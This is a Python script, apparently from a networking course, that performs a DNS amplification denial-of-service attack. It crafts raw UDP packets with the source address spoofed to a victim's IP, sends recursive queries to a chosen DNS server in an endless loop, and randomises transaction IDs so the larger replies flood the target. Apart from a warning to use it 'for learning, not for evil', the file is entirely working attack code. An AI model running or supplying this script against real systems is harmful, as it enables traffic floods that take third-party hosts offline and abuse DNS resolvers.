#!/usr/bin/python

"Amplify DNS - This sends DNS requests to a DNS server that will be amplified \
(the responses are much larger than the requests) and sent to a target \
machine. DO NOT DISTRIBUTE. This code can do bad things; use it for learning, \
not for evil."

import socket
import string
import struct
import random
import sys
from impacket import ImpactPacket


def main():

    if not (len(sys.argv) == 3):
        print "Syntax:"
        print "    python amplify-dns.py <dns-server> <target>"
        print "  dns-server is the IP address of the DNS server who's replies will be redirected to the target."
        print "  target is the IP address of the attack target."
        print
        print "DO NOT DISTRIBUTE THIS CODE. It can do bad things; use it for learning, not for evil."
        exit()


    server_address = (sys.argv[1], 53)
    target_address = (sys.argv[2], 8080)

    # Create a UDP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    try:
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        #sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        #sock.bind(target_address) # spoof sender address so response goes to the target

        random.seed() # randome used to generate unique-(ish) Transaction IDs

        ip = ImpactPacket.IP()
        ip.set_ip_src(target_address[0])
        ip.set_ip_dst(server_address[0])
        udp = ImpactPacket.UDP()
        udp.set_uh_sport(target_address[1])
        udp.set_uh_dport(server_address[1])
        ip.contains(udp)
        request_msg = create_dns_request("www.cs6250.com")

        while True:
            # Replace Transaction ID on each retransmission (so they look unique)
            request_msg[0] = struct.pack('!BB', random.randint(0, 255), random.randint(0, 255))
            udp.contains(ImpactPacket.Data("".join(request_msg)))
            sock.sendto(ip.get_packet(), server_address)

    finally:
        sock.close()


def create_dns_request_header():
    header = []

    # Transaction ID
    header.append(struct.pack('!BB', random.randint(0, 255), random.randint(0, 255)))

    # Flags:
    # QR=0 (query)
    # OPCODE=0 QUERY (standard query)
    # AA=0 (this flag not valid for requests)
    # TC=0 (message not truncated)
    # RD=1 (recursive query)
    # RA=0 (this flag not valid for requests)
    # Z=0 (this flag reserved for future use; required to be 0)
    # RCODE=0 (this flag not valid for requests)
    header.append(struct.pack('!BB', 1, 0))

    # QDCOUNT=1, ANCOUNT=0, NSCOUNT=0, and ARCOUNT=0
    header.append(struct.pack('!HHHH', 1, 0, 0, 0))

    return header


def create_dns_request(query_domain):
    query = create_dns_request_header()

    # QNAME=query_domain parameter
    domain_parts = string.split(query_domain, ".")
    for part in domain_parts:
      query.append(struct.pack('!B', len(part)))
      query.append(part)
    query.append(struct.pack('!B', 0))

    # QTYPE=A, QCLASS=IN
    query.append(struct.pack('!HH', 1, 1))

    return query


main()
